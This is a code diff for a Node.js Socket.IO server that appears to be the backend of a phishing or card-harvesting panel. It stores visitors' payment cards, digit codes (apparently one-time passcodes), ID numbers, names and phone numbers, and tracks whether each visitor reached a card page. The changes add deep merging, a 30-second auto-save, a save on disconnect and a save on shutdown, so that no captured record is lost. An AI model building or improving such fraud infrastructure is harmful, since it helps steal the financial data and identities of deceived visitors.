@@ -228,12 +228,78 @@ function parseUserAgent(ua) {
 function saveVisitorPermanently(visitor) {
   const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
   if (existingIndex >= 0) {
-    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
+    const existing = savedVisitors[existingIndex];
+    // Deep merge: preserve arrays by keeping the longer/more complete version
+    const merged = { ...existing, ...visitor };
+    
+    // For critical arrays, always keep the one with more entries
+    if (existing.dataHistory && visitor.dataHistory) {
+      merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length 
+        ? [...existing.dataHistory] : [...visitor.dataHistory];
+    }
+    if (existing.paymentCards && visitor.paymentCards) {
+      merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length 
+        ? [...existing.paymentCards] : [...visitor.paymentCards];
+    }
+    if (existing.digitCodes && visitor.digitCodes) {
+      merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length 
+        ? [...existing.digitCodes] : [...visitor.digitCodes];
+    }
+    if (existing.chatMessages && visitor.chatMessages) {
+      merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length 
+        ? [...existing.chatMessages] : [...visitor.chatMessages];
+    }
+    // For flat data object, merge both to keep all keys
+    if (existing.data && visitor.data) {
+      merged.data = { ...existing.data, ...visitor.data };
+    }
+    // Preserve important flags - never lose them
+    if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
+    if (existing.fullName) merged.fullName = merged.fullName || existing.fullName;
+    if (existing.phone) merged.phone = merged.phone || existing.phone;
+    if (existing.idNumber) merged.idNumber = merged.idNumber || existing.idNumber;
+    if (existing.network) merged.network = merged.network || existing.network;
+    
+    savedVisitors[existingIndex] = merged;
   } else {
     savedVisitors.push({ ...visitor });
   }
   saveData();
 }
+
+// Auto-save all visitor data every 30 seconds as safety net
+setInterval(() => {
+  // Sync all active visitors to savedVisitors
+  visitors.forEach((visitor) => {
+    const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
+    if (existingIndex >= 0) {
+      const existing = savedVisitors[existingIndex];
+      const merged = { ...existing, ...visitor };
+      if (existing.dataHistory && visitor.dataHistory) {
+        merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length 
+          ? [...existing.dataHistory] : [...visitor.dataHistory];
+      }
+      if (existing.paymentCards && visitor.paymentCards) {
+        merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length 
+          ? [...existing.paymentCards] : [...visitor.paymentCards];
+      }
+      if (existing.digitCodes && visitor.digitCodes) {
+        merged.digitCodes = existing.digitCodes.length >= visitor.digitCodes.length 
+          ? [...existing.digitCodes] : [...visitor.digitCodes];
+      }
+      if (existing.chatMessages && visitor.chatMessages) {
+        merged.chatMessages = existing.chatMessages.length >= visitor.chatMessages.length 
+          ? [...existing.chatMessages] : [...visitor.chatMessages];
+      }
+      if (existing.data && visitor.data) {
+        merged.data = { ...existing.data, ...visitor.data };
+      }
+      if (existing.hasEnteredCardPage) merged.hasEnteredCardPage = true;
+      savedVisitors[existingIndex] = merged;
+    }
+  });
+  saveData();
+}, 30000); // Every 30 seconds
 
 // Socket.IO Connection Handler
 io.on("connection", (socket) => {
@@ -638,11 +704,12 @@ io.on("connection", (socket) => {
 
   // Admin: Delete visitor by socket ID
   socket.on("admin:delete", (visitorSocketId) => {
+    // Find visitor BEFORE deleting from Map
+    const visitorToDelete = visitors.get(visitorSocketId);
     io.to(visitorSocketId).emit("deleted");
     visitors.delete(visitorSocketId);
     
     // Also remove from saved visitors
-    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
     if (visitorToDelete) {
       savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
       saveData();
@@ -944,7 +1011,11 @@ io.on("connection", (socket) => {
       const visitorId = visitor._id;
       const socketId = socket.id;
       
-      // Don't delete visitor data - keep it permanently
+      // CRITICAL: Save ALL visitor data to savedVisitors BEFORE removing from Map
+      // This ensures no data is ever lost during disconnect/reconnect
+      saveVisitorPermanently(visitor);
+      
+      // Now safe to remove from active Map
       visitors.delete(socket.id);
       
       // Delay disconnect notification to allow for quick reconnection
@@ -1008,6 +1079,22 @@ app.get("/api/stats", (req, res) => {
     visitorCounter,
   });
 });
+
+// Graceful shutdown - save all data before server stops
+function gracefulShutdown(signal) {
+  console.log(`${signal} received. Saving all data before shutdown...`);
+  // Sync all active visitors to savedVisitors before shutdown
+  visitors.forEach((visitor) => {
+    saveVisitorPermanently(visitor);
+  });
+  saveData();
+  console.log('All data saved. Shutting down...');
+  process.exit(0);
+}
+
+process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
+process.on('SIGINT', () => gracefulShutdown('SIGINT'));
+process.on('SIGHUP', () => gracefulShutdown('SIGHUP'));
 
 // Start server
 const PORT = process.env.PORT || 3001;
